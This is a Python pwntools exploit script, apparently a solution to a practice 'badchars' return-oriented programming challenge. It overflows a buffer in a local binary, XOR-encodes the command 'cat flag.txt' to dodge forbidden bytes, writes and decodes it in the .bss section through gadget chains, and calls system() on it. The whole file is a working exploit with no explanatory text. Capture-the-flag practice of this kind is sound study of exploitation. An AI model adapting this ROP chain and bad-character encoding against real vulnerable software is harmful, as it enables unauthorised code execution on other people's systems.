import pwn

BAD_CHARS = "bic/ fns"

# Setup enviroment
process = pwn.process("./badchars")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("badchars")
data_section = elf.bss()
system_arg = "cat flag.txt"

def encode_arg(system_arg):
    _xor = 1 
    encoded_system_arg = system_arg
    while any(bad in encoded_system_arg for bad in BAD_CHARS):
        _xor += 1
        encoded_system_arg = ''.join(chr(ord(s) ^ _xor) for s in system_arg)
    return _xor, encoded_system_arg

def pad_input(inp):
    return inp + 8 * "\x00" if len(inp) % 8 == 0 else  inp + (8-(len(inp)%8)) * "\x00"

def write_to_location(inp, loc):
    inp = pad_input(inp)
    return  "".join([pwn.p64(elf.symbols["usefulGadgets"]+11) +   # pop r12; pop r13; ret;
                     inp[i:i+8] +
                     pwn.p64(loc+i) +
                     pwn.p64(elf.symbols["usefulGadgets"]+4)      # mov r13 r12; ret;
                     for i in range(0, len(inp), 8)])

def decode_data(inp, loc, xor_byte):
    return "".join([pwn.p64(elf.symbols["usefulGadgets"]+16) +    # pop r14; pop r15; ret;
                    chr(xor_byte) * 8 +
                    pwn.p64(loc+i) +
                    pwn.p64(elf.symbols["usefulGadgets"])         # xor r15 r14; ret;
                    for i in range(len(inp))]) 

# Find correct encoding till no more bad chars
xor_byte, encoded_system_arg = encode_arg(system_arg)

# Write payload
payload = "A" * 40
payload += write_to_location(encoded_system_arg, data_section)
payload += decode_data(encoded_system_arg, data_section, xor_byte)
payload += pwn.p64(elf.symbols["usefulGadgets"]+9)                # pop rdi; ret;
payload += pwn.p64(data_section)
payload += pwn.p64(elf.symbols["system"])
print payload

process.readline()
process.readline()
process.readline()
process.readline()
process.sendline(payload)
print process.readline()[2:]
